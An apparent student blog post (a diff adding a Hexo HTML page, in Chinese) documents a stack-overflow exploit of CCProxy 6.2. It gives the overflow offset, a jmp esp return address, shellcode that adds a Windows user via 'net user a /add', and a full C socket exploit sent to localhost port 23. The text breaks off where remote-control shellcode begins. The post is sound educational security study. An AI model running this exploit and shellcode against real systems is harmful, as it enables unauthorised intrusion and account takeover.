@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="code-o4T2nkcjRx" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="栈溢出,字符串,软件安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CCPROXY漏洞利用 CCProxy是一款非常流行的下载量最大的的国产代理服务器软件，其CCProxy 6.2版本存在一个栈溢出漏洞，可以通过此漏洞进行shellcode攻击，以下是学习过程的一个小记录吧 : )">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCPROXY漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2020/11/02/CCPROXY%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="panfengblog">
+<meta property="og:description" content="CCPROXY漏洞利用 CCProxy是一款非常流行的下载量最大的的国产代理服务器软件，其CCProxy 6.2版本存在一个栈溢出漏洞，可以通过此漏洞进行shellcode攻击，以下是学习过程的一个小记录吧 : )">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSPhPP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0zeYa4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSiJRf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSFFOg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSkAgK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSEFOO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSVP4s.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSMKLq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSQE0x.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSlk8g.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSlaa6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSUvYn.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/20/BSwCa4.png">
+<meta property="article:published_time" content="2020-11-02T12:22:25.865Z">
+<meta property="article:modified_time" content="2020-11-02T12:23:07.266Z">
+<meta property="article:author" content="panfeng&#39;s blog">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="字符串">
+<meta property="article:tag" content="软件安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/10/20/BSPhPP.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/11/02/CCPROXY漏洞利用/"/>
+
+
+
+
+
+  <title>CCPROXY漏洞利用 | panfengblog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/AgentGuo" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">panfengblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/02/CCPROXY%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="panfeng's blog">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://note.youdao.com/yws/api/personal/file/94706D7C9BE34FFEBAD4C35B311F0E38?method=download&shareKey=5a712edcc9469413b507c8ef9cf15513">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="panfengblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CCPROXY漏洞利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-11-02T20:22:25+08:00">
+                2020-11-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">软件安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/11/02/CCPROXY%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2020/11/02/CCPROXY漏洞利用/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/11/02/CCPROXY%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="leancloud_visitors" data-flag-title="CCPROXY漏洞利用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  3.7k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="CCPROXY漏洞利用"><a href="#CCPROXY漏洞利用" class="headerlink" title="CCPROXY漏洞利用"></a>CCPROXY漏洞利用</h1><blockquote>
+<p>CCProxy是一款非常流行的下载量最大的的国产代理服务器软件，其CCProxy 6.2版本存在一个栈溢出漏洞，可以通过此漏洞进行shellcode攻击，以下是学习过程的一个小记录吧 : )</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="1-找到并定位溢出点"><a href="#1-找到并定位溢出点" class="headerlink" title="1.找到并定位溢出点"></a>1.找到并定位溢出点</h2><ol>
+<li>使用ping命令加一个超长的字符串加一个主机名，代理端会返回Host not found。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSPhPP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSPhPP.png" alt="BSPhPP.png"></a></p>
+<ol>
+<li>当输入的字符串足够长时（比如2000个a），软件就会溢出奔溃，通过二分法尝试，发现ping后最多接1009个字符，第1010字符开始溢出，并且前四字节无用，如下图，当输入1013个a字符时，此时就有一个字符a溢出到了EIP的地址中</li>
+</ol>
+<p><a href="https://imgchr.com/i/0zeYa4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/19/0zeYa4.png" alt="0zeYa4.png"></a></p>
+<ol>
+<li>然后使用OD观察EIP被溢出填充的过程，首先使用查找找到Host not found所在的语句，然后设置内存访问断点（硬件执行断点断不下来）。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSiJRf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSiJRf.png" alt="BSiJRf.png"></a></p>
+<ol>
+<li>然后执行ping加超长字符串（比如2000个字符a），成功在Host not found处断了下来。然后单部跳过往下执行到retn 0xc 指令，此时将要EIP = [ESP]，ESP = ESP + 0xc+0x4。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSFFOg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSFFOg.png" alt="BSFFOg.png"></a></p>
+<ol>
+<li>执行retn 0xc指令，果然如分析的那样，所以我们只需要将堆栈段0x011766F8填充成我们希望执行的EIP指令地址即可，这里使用jmp esp，所以我们希望填充0x7FFA4512，于是就会执行jmp esp，紧接着就会跳转到0x01176700，我们只需要将我们的shell code填到此处就可以。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSkAgK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSkAgK.png" alt="BSkAgK.png"></a></p>
+<h2 id="2-完成基本的添加用户Shellcode"><a href="#2-完成基本的添加用户Shellcode" class="headerlink" title="2.完成基本的添加用户Shellcode"></a>2.完成基本的添加用户Shellcode</h2><ol>
+<li>然后开始编写shellcode，其实shellcode非常简单，想要在目标主机上创建一个用户，命令就是system(“net user 用户名/add”)，该函数就在windows的msvsrt.dll动态链接库中，于是我们编写如下一份C语言代码。</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LoadLibrary(<span class="string">"msvcrt.dll"</span>);</span><br><span class="line">	__asm &#123;</span><br><span class="line">			push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">			mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">			<span class="keyword">xor</span> edi,edi ;</span><br><span class="line">			push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,</span><br><span class="line">;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line"> 			sub esp,<span class="number">0</span>ch</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-10</span>h],<span class="number">6</span>eh;n</span><br><span class="line">			mov byte ptr [ebp<span class="number">-0f</span>h],<span class="number">65</span>h;e</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-0</span>eh],<span class="number">74</span>h;t</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-0</span>dh],<span class="number">20</span>h;空格</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-0</span>ch],<span class="number">75</span>h;u</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-0b</span>h],<span class="number">73</span>h;s</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-0</span>ah],<span class="number">65</span>h;e</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-09</span>h],<span class="number">72</span>h;r</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-08</span>h],<span class="number">20</span>h;空格</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-07</span>h],<span class="number">61</span>h;a</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-06</span>h],<span class="number">20</span>h;空格</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-05</span>h],<span class="number">2f</span>h;/</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-04</span>h],<span class="number">61</span>h;a</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-03</span>h],<span class="number">64</span>h;d</span><br><span class="line"> 			mov byte ptr [ebp<span class="number">-02</span>h],<span class="number">64</span>h;d</span><br><span class="line"> 			lea eax,[ebp<span class="number">-10</span>h] ;</span><br><span class="line"> 			push eax ;串地址作为参数入栈</span><br><span class="line"> 			mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line"> 			call eax ;调用system</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>然后反汇编得到汇编代码，然后查看查看汇编代码对应的机器码（使用memory窗口查看），然后保存我们得到的shellcode，为后续使用做准备。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSEFOO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSEFOO.png" alt="BSEFOO.png"></a></p>
+<ol>
+<li>执行完上述程序后可以发现成功的添加了一个a用户。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSVP4s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSVP4s.png" alt="BSVP4s.png"></a></p>
+<h2 id="3-利用缓冲区溢出执行ShellCode"><a href="#3-利用缓冲区溢出执行ShellCode" class="headerlink" title="3.利用缓冲区溢出执行ShellCode"></a>3.利用缓冲区溢出执行ShellCode</h2><p>1.我们首先需要执行jmp esp指令，所以我们填入的1013~1016字节应该填入FFA4512，然后就会执行JMP ESP，然后就会跳转到第1013+0xc+0x4字节处处执行，但是我们的shellcode需要放在第5个字节到1012个字节之间（因为CCPROXY有一个字符串覆盖操作，会将第5个字节到1012字节复制到1013+0xc+0x4字节处），由于shellcode许多都是不可见字符，不能手动执行，于是我们编写如下的C语言代码（最好使用cpp，否则会有一堆错误）。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shell[] =&#123; <span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x33</span>,<span class="number">0xFF</span>,<span class="number">0x57</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x0C</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF0</span>,<span class="number">0x6E</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF1</span>,<span class="number">0x65</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF2</span>,<span class="number">0x74</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF3</span>,<span class="number">0x20</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF4</span>,<span class="number">0x75</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF5</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF6</span>,<span class="number">0x65</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF7</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x20</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF9</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFA</span>,<span class="number">0x20</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFB</span>,<span class="number">0x2F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFC</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFD</span>,<span class="number">0x64</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFE</span>,<span class="number">0x64</span>,<span class="number">0x8D</span>,<span class="number">0x45</span>,<span class="number">0xF0</span>,<span class="number">0x50</span>,<span class="number">0xB8</span>,<span class="number">0xC7</span>,<span class="number">0x93</span>,<span class="number">0xBF</span>,<span class="number">0x77</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WSADATA ws; <span class="comment">// 初始化 ws</span></span><br><span class="line">	<span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">	sa.sin_family = AF_INET;</span><br><span class="line">	sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">	sa.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">	<span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">	buf[<span class="number">0</span>]=<span class="string">'p'</span>;buf[<span class="number">1</span>]=<span class="string">'i'</span>;buf[<span class="number">2</span>]=<span class="string">'n'</span>;buf[<span class="number">3</span>]=<span class="string">'g'</span>;buf[<span class="number">4</span>]=<span class="string">' '</span>;</span><br><span class="line">	<span class="comment">// 插入Shellcode</span></span><br><span class="line">	<span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">	<span class="comment">//前4个字节为无用字节</span></span><br><span class="line">	buf[<span class="number">5</span>]=buf[<span class="number">6</span>]=buf[<span class="number">7</span>]=buf[<span class="number">8</span>]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span>+l; j++)&#123;</span><br><span class="line">		buf[j] = shell[j<span class="number">-9</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//开始填入shellcode</span></span><br><span class="line">	<span class="comment">//该处代码自己研究;</span></span><br><span class="line">	<span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">9</span>+l;i&lt;<span class="number">1012</span>+<span class="number">5</span>;i++)</span><br><span class="line">	buf[i]=<span class="string">'a'</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//在溢出点处填入 jump esp 指令的地址该处代码自己研究</span></span><br><span class="line">	buf[<span class="number">1017</span>] = <span class="number">0x12</span>;</span><br><span class="line">	buf[<span class="number">1018</span>] = <span class="number">0x45</span>;</span><br><span class="line">	buf[<span class="number">1019</span>] = <span class="number">0xFA</span>;</span><br><span class="line">	buf[<span class="number">1020</span>] = <span class="number">0x7F</span>;</span><br><span class="line">	<span class="comment">//7FFA4512</span></span><br><span class="line">	<span class="comment">//继续填充无用字节</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1021</span>;i&lt;<span class="number">1998</span>;i++)</span><br><span class="line">	buf[i]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="comment">//命令结束加上\r\n</span></span><br><span class="line">	buf[<span class="number">1998</span>]=<span class="string">'\r'</span>;buf[<span class="number">1999</span>]=<span class="string">'\n'</span>;</span><br><span class="line">	<span class="comment">// 创建 socket</span></span><br><span class="line">	SOCKET sc = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">//连接到服务器</span></span><br><span class="line">	ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="comment">//接收服务器端的回答</span></span><br><span class="line">	recv(sc,buf1,<span class="number">1024</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 发送攻击数据</span></span><br><span class="line">	ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">	closesocket(sc);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>然后运行CCPROXY，再执行刚刚编写的代码，发现CCPROXY成功溢出奔溃，并且计算成功添加了一个账户a（事先已经删除账户a的情况下）</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSMKLq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSMKLq.png" alt="BSMKLq.png"></a></p>
+<ol>
+<li>然后使用OD再Host not found处设置断点分析整个过程，可以看到此时esp处存放着JMP ESP指令地址，并且shellcode恰好就好[esp+0xc+0x4]的位置（shellcode是从5~1013字节复制过来的）。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSQE0x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSQE0x.png" alt="BSQE0x.png"></a></p>
+<ol>
+<li>执行retn 0xc指令，成功跳转到JMP ESP指令，并且此时ESP = ESP+0xc+0x4</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSlk8g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSlk8g.png" alt="BSlk8g.png"></a></p>
+<ol>
+<li>然后通过JMP ESP就成功跳转到了shellcode，完成添加用户的操作。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSlaa6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSlaa6.png" alt="BSlaa6.png"></a></p>
+<h2 id="4-实现一个具备远程连接控制功能的ShellCode"><a href="#4-实现一个具备远程连接控制功能的ShellCode" class="headerlink" title="4.实现一个具备远程连接控制功能的ShellCode"></a>4.实现一个具备远程连接控制功能的ShellCode</h2><ol>
+<li>要实现远程连接，我们可以使用vmic命令完成，也是通过system()函数进行运行DOC命令，我们需要使用的wmic命令如下：</li>
+</ol>
